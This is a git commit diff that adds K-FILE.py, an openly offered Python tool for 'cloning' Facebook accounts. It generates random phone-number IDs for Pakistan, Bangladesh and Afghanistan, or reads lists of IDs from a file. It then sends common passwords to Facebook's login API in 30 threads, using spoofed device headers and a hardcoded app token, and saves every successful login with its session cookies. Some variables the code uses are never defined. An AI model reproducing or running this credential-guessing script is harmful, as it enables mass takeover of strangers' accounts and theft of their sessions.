93f4a70a8673053ddee44df5638f0e56dd40c5f3
KHALID SHAIFULLAH <94977283+KHALID-404@users.noreply.github.com>
2023-10-13 23:52:15 +0600

    Update K-FILE.py

--- K-FILE.py
+++ K-FILE.py
@@ -1,6 +1,317 @@
+samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 import os
-print("\033[1;92m PLEASE SUBSCRIBE MY CHANNEL 😭")
-os.system("xdg-open https://youtube.com/@Khalid_Vau?feature=share9")
-print("\033[1;93mPLEASE JOIN MY WHATSAPP GROUP")
-os.system("xdg-open https://chat.whatsapp.com/H2g8mK22ziIEtJo3pbxvsL")
-os.system("python K-FILE1.py")
+from os import path
+from pathlib import Path
+import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
+try:
+	import requests,os,json,time,re,random,sys,uuid,string
+	from string import *
+	from requests import api
+	from concurrent.futures import ThreadPoolExecutor as tred
+except ImportError:
+	os.system('python K-FILE.py')
+os.system("clear")
+def clear():
+    os.system('clear')
+    print(logo)
+oks=[]
+G ="\033[1;92m"
+cps=[]
+loop=0
+logo=("""
+\x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m █████  \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██████    \x1b[1;94m
+\x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██   ██  \x1b[1;94m
+\x1b[1;92m  █████   \033[1;33m███████ \x1b[1;91m███████ \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██   ██   \x1b[1;94m
+\x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██   ██  \x1b[1;94m
+\x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m███████ \x1b[1;96m██ \x1b[1;95m██████   \x1b[1;94m
+\033[1;97m┏\033[1;92m═══════════════════════════════┳═══════════\033[1;97m╗
+\033[1;97m║ \033[1;96mDEVOLPER : \033[1;92mKHALID SHAIFULLAH  \033[1;92m║\033[0;101mVERSION-1.5\033[0m\033[1;97m║
+\033[1;97m║ \033[1;96mFACEBOOK : \033[1;93mKHALID SHAIFULLAH  \033[1;92m║═══════════\033[1;97m║
+\033[1;97m║ \033[1;96mGITHUB   : \033[1;94mKHALID-404         \033[1;92m║ \033[1;93m FILE-PRO \033[1;97m║
+\033[1;97m║ \033[1;96mWHATSAPP : \033[1;95m+8801798396843     \033[1;92m║\033[1;92mBANGLADESH \033[1;97m║
+\033[1;97m┗\033[1;92m═══════════════════════════════┻═══════════\033[1;97m╝\033[0m""")
+def linex():
+	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
+def Khalid():
+		clear()
+		print(f'\033[1;91m[\033[1;92m•\033[1;91m] [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [4] WhatsApp group(Join) \n [5] Follow my fb id \n [0] Exit')
+		linex()
+		shm= input(f'\033[1;91m[\033[1;92m•\033[1;91m] CHOICE : {G}')
+		if shm =='1':
+			file_crack()
+		elif shm =='2':
+			r_crack()
+		elif shm =='3':
+			gmail()
+		elif shm =='4':
+			wp=('KpSthW03CQR0wOim0sKtFX')
+			os.system('xdg-open https://chat.whatsapp.com/CCx5u5coOHDAyOKpk9BxD8')
+			Khalid()
+		elif shm =='5':
+			os.system('xdg-open https://www.facebook.com/aayan.malik.5')
+			Khalid()
+		elif shm =='0':
+			exit('\033[1;94mTHANKS FOR USING MY TOOL ')
+		else:
+			print('\033[1;91m[\033[1;92m•\033[1;91m]Select valid option\033[1;91m[\033[1;92m•\033[1;91m] ')
+			time.sleep(0.5)
+			Khalid()
+
+def file_crack():
+	clear()
+	file = input(' \033[1;91m[\033[1;92m•\033[1;91m] Put file path :\033[1;32m ')
+	try:
+		fo = open(file,'r').read().splitlines()
+	except FileNotFoundError:
+		print('\033[1;91m[\033[1;92m•\033[1;91m] File location not found ');exit()
+	clear()
+	plist=[]
+	clear()
+	try:
+		ps_limit = int(input('\033[1;91m[\033[1;92m•\033[1;91m] HOW MANY PASWORD DO YOU WANT TO ADD :  '))
+	except:
+		ps_limit =1
+#	linex()
+#	print('\033[1;91m[\033[1;92m•\033[1;91m] example :\033[1;91m[\033[1;92m•\033[1;91m]first last, firtslast, first123')
+	linex()
+	for i in range(ps_limit):
+		plist.append(input(f'\033[1;91m[\033[1;92m•\033[1;91m] Put Password No.{i+1}: '))
+	with tred(max_workers=30) as KHALID:
+		clear()
+		tl = str(len(fo))
+		linex()
+		print('\033[1;91m[\033[1;92m•\033[1;91m] TOTAL ACCOUNTS :\033[1;32m'+tl)
+		print('\033[1;91m[\033[1;92m•\033[1;91m] CLONING IS RUNNING IN THE BACKGROUND ')
+		linex()
+		for user in fo:
+			ids,names = user.split('|')
+			passlist = plist
+			if methd =='1':
+				KHALID.submit(api1,ids,names,passlist)
+			else:
+				KHALID.submit(api1,ids,names,passlist)
+	print('\033[1;91m[\033[1;92m•\033[1;91m]')
+	linex()
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] THE PROCESS HAS COMPLETED')
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' \033[1;91m[\033[1;92m•\033[1;91m] PRESS ENTER TO BACK \033[1;91m[\033[1;92m•\033[1;91m]')
+	os.system('python KHALID.py')
+
+def r_crack():
+	clear()
+	print(' \033[1;91m[\033[1;92m1\033[1;91m] PAKISTAN CLONING ')
+	print(' \033[1;91m[\033[1;92m2\033[1;91m] BANGLADESH CLONING ')
+	print(' \033[1;91m[\033[1;92m3\033[1;91m] AFGHANISTAN CLONING ')
+	print(' \033[1;91m[\033[1;92m0\033[1;91m] BACK TO MENU ')
+	linex()
+	crk=input(' \033[1;91m[\033[1;92m•\033[1;91m] Select Option:\33[1;37m ')
+	if crk =='1':
+		pak()
+	elif crk =='2':
+		bd()
+	elif crk =='3':
+		afg()
+	elif crk =='0':
+		Menu_Khalid()
+	else:
+		print('\n  \033[1;91m[\033[1;92m•\033[1;91m] Select valid option\033[1;91m[\033[1;92m•\033[1;91m] ');time.sleep(1.5);menu()
+
+def pak():
+	user=[]
+	clear()
+	code = input('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Enter Code :\33[1;37m ')
+	try:
+		limit = int(input(' \033[1;91m[\033[1;92m•\033[1;91m] Enter limit:\33[1;37m '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with tred(max_workers=30) as KHALID:
+		clear()
+		tl = str(len(user))
+		print(' \033[1;91m[\033[1;92m•\033[1;91m] Total accounts : \033[1;32m'+tl)
+		print('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Selected code  :\033[1;32m '+code)
+		print('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Process has been started\033[1;97m')
+		linex()
+		for psx in user:
+			ids = code+psx
+			passlist = [psx,ids,'khankhan','khan123','malik123','baloch123','kingkhan','khan12345','malik1234','khanbaba','pak123','pak786','malik1122','khan1122']
+			KHALID.submit(rd1,ids,passlist)
+	print('\033[1;91m[\033[1;92m•\033[1;91m]')
+	linex()
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] The process has completed')
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' \033[1;91m[\033[1;92m•\033[1;91m] PRESS ENTER TO BACK \033[1;91m[\033[1;92m•\033[1;91m]')
+	os.system('python KHALID.py')
+
+
+def bd():
+	user=[]
+	clear()
+	code = input(' \033[1;91m[\033[1;92m•\033[1;91m] Enter Code :\33[1;37m ')
+	try:
+		limit = int(input(' \033[1;91m[\033[1;92m•\033[1;91m] Enter limit:\33[1;37m '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(8))
+		user.append(nmp)
+	with tred(max_workers=30) as KHALID:
+		clear()
+		tl = str(len(user))
+		print(' \033[1;91m[\033[1;92m•\033[1;91m] Total accounts : \033[1;32m'+tl)
+		print('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Selected code  :\033[1;32m '+code)
+		print('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Process has been started \033[1;97m')
+		linex()
+		for psx in user:
+			ids = code+psx
+			passlist = ['i love you','bangladesh','freefire','bangla123','bangladesh123',ids,psx]
+			KHALID.submit(rd1,ids,passlist)
+	print('\033[1;91m[\033[1;92m•\033[1;91m]')
+	linex()
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] The process has completed')
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' \033[1;91m[\033[1;92m•\033[1;91m] PRESS ENTER TO BACK \033[1;91m[\033[1;92m•\033[1;91m]')
+	os.system('python KHALID.py')
+
+def afg():
+	user=[]
+	clear()
+	code = input(' \033[1;91m[\033[1;92m•\033[1;91m] Enter Code :\33[1;37m ')
+	try:
+		limit = int(input(' \033[1;91m[\033[1;92m•\033[1;91m] Enter limit:\33[1;37m '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with tred(max_workers=30) as KHALID:
+		clear()
+		tl = str(len(user))
+		print(' \033[1;91m[\033[1;92m•\033[1;91m] Total accounts : \033[1;32m'+tl)
+		print('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Selected code  :\033[1;32m '+code)
+		print('\33[1;37m \033[1;91m[\033[1;92m•\033[1;91m] Process running in the background\033[1;97m')
+		linex()
+		for psx in user:
+			ids = code+psx
+			passlist = [ids,psx,'100200','afghanistan','Afghan123','afghan1122','kabul123']
+			KHALID.submit(rd1,ids,passlist)
+	print('\033[1;91m[\033[1;92m•\033[1;91m]')
+	linex()
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] The process has completed')
+	print(' \033[1;91m[\033[1;92m•\033[1;91m] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' \033[1;91m[\033[1;92m•\033[1;91m] PRESS ENTER TO BACK \033[1;91m[\033[1;92m•\033[1;91m]')
+	os.system('python KHALID.py')
+
+def rd1(ids,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\33[1;37m[KHALID]  %s|  OK:-%s \033[1;91m[\033[1;92m•\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
+		for pas in passlist:
+				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+				fbbv = str(random.randint(000000000,999999999))
+				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+				fbbv = str(random.randint(000000000,999999999))
+				fbrv = str(random.randint(000000000,999999999))
+				fbsv = str(random.randint(4,13))+'.0'
+				model,build = random.choice(samsung).split('|')
+				fbmf = 'samsung'
+				fbbd = 'samsung'
+				en = random.choice(['en_US','en_GB'])
+				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
+				ua  = "[FBAN/FB4A;FBAV/356.0.0.3.138;FBBV/766769450;FBDM/{density=3.3,width=1080,height=1442};FBLC/en_US;FBRV/335184783;FBCR/EE;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy A7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+				po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
+				if 'session_key' in po:
+						uid = str(po['uid'])
+						ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+						ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+						cookie = f"sb={ssbb};{ckkk}"
+						print('\r\r\033[1;32m[KHALID-OK] '+uid+' | '+pas)
+						#print(' \33[1;96m[Cookies] == '+cookie)
+						file_path_ok = os.path.join(folder_path, 'KHALID_RANDOM_OK.txt')
+						file_path_cookies = os.path.join(folder_path, 'KHALID_COOKIES.txt')
+						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
+							file_ok.write(uid+'|'+pas+'\n')
+							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
+						oks.append(uid)
+						break
+				elif 'www.facebook.com' in po['error']['message']:
+						uid = str(po['error']['error_data']['uid'])
+						#print(f'\r\r\33[1m\33[1;35m [KHALID-CP] '+uid+' | '+pas+'\033[1;97m')
+						file_path = os.path.join(folder_path, 'KHALID-CP.txt')
+						with open(file_path, 'a') as file:
+							file.write(uid+'|'+pas+'\n')
+						cps.append(uid)
+						break
+				else:
+					continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+
+def api1(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\33[1;37m[KHALID-M1]  %s|  OK:-%s \033[1;91m[\033[1;92m•\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(000000000,999999999))
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(000000000,999999999))
+			fbrv = str(random.randint(000000000,999999999))
+			fbsv = str(random.randint(4,13))+'.0'
+			model,build = random.choice(samsung).split('|')
+			fbmf = 'samsung'
+			fbbd = 'samsung'
+			en = random.choice(['en_US','en_GB'])
+			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
+			ua  = "[FBAN/FB4A;FBAV/356.0.0.3.138;FBBV/766769450;FBDM/{density=3.3,width=1080,height=1442};FBLC/en_US;FBRV/335184783;FBCR/EE;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy A7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+					uid = str(po['uid'])
+					print('\r\r\033[1;32m [KHALID-OK] '+uid+' | '+pas)
+					file_path = os.path.join(folder_path, 'KHALID_FILE_OK.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'\n')
+					oks.append(uid)
+					break
+			elif 'www.facebook.com' in po['error']['message']:
+					uid = str(po['error']['error_data']['uid'])
+					#print(f'\r\r\33[1m\33[1;35m [KHALID-CP] '+uid+' | '+pas+'\033[1;97m')
+					file_path = os.path.join(folder_path, 'KHALID-CP.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'\n')
+					cps.append(uid)
+					break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+
+Khalid()
